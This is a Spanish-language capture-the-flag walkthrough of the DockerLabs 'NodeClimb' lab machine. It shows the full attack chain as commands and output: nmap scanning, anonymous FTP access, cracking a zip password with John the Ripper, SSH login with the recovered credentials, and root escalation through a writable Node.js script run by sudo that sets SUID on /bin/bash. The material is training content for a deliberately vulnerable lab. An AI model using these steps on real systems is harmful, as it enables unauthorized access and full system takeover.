---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NodeClimb DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip nodeclimb.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh nodeclimb.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 08:57 EST
Nmap scan report for insanity.dl (172.17.0.2)
Host is up (0.000053s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.71 second
```

Vemos que hay un `FTP` por lo que vamos a ver si podemos meternos de forma anonima.

## FTP

```shell
ftp anonymous@<IP>
```

Dejamos la contraseña vacia y veremos que estamos dentro, si listamos lo que contiene veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||54817|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
226 Directory send OK.
```

Vemos que hay un archivo llamado `secretitopicaron.zip`, por lo que nos lodescargaremos de la siguiente forma:

```shell
get secretitopicaron.zip
```

Ahora nos saldremos del `FTP` y veremos si podemos descomprimir el archivo, pero si lo intentamos veremos que esta protegido con contraseña, por lo que la intentaremos `crackear` de la siguiente forma:

## John The Ripper

```shell
zip2john secretitopicaron.zip > hash
```

Ahora intentaremos `crackear` el `hash` que obtuvimos del `ZIP`:

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (secretitopicaron.zip/password.txt)     
1g 0:00:00:00 DONE (2025-01-25 10:26) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que la contraseña es `password1` por lo que haremos lo siguiente.

## Escalate user mario

```shell
unzip secretitopicaron.zip
```

Metemos como contraseña `password1` y veremos que se nos descomprimio de forma correcta y obtendremos un archivo llamado `password.txt` que si lo leemos veremos lo siguiente:

```shell
cat password.txt
```

Info:

```
mario:laKontraseñAmasmalotaHdelbarrioH
```

Ahora probaremos a conectarnos por `ssh`.

### SSH

```shell
ssh mario@<IP>
```

Metemos como contraseña `laKontraseñAmasmalotaHdelbarrioH` y veremos que estamos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for mario on ce01e9447984:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on ce01e9447984:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

Vemos que podemos ejecutar el binario `node` junto al `script.js` como el usuario `root`, por lo que haremos lo siguiente:

Si vemos los permisos que tiene el `script.js` veremos lo siguiente:

```shell
ls -la /home/mario/script.js
```

Info:

```
-rw-r--r-- 1 mario mario 0 Jul  5  2024 /home/mario/script.js
```

Vemos que tenemos permiso para poder editarlo o hacer lo que queramos, por lo que haremos lo siguiente.

> script.js

```js
const { exec } = require("child_process");

// Comando para habilitar el bit setuid en /bin/bash
const command = "chmod u+s /bin/bash";

exec(command, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error ejecutando el comando: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Error de salida: ${stderr}`);
    return;
  }
  console.log(`Comando ejecutado exitosamente: ${stdout}`);
});
```

Por lo que ahora lo ejecutaremos de la siguiente forma:

```shell
sudo node /home/mario/script.js
```

Info:

```
Comando ejecutado exitosamente:
```

Ahora si listamos la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Vemos que ha funcionado perfectamente y ya tendremos la `bash` con permisos `SUID`, por lo que haremos lo siguiente:

```shell
bash -p
```

Con esto ya seremos `root` por lo que habremos terminado la maquina.
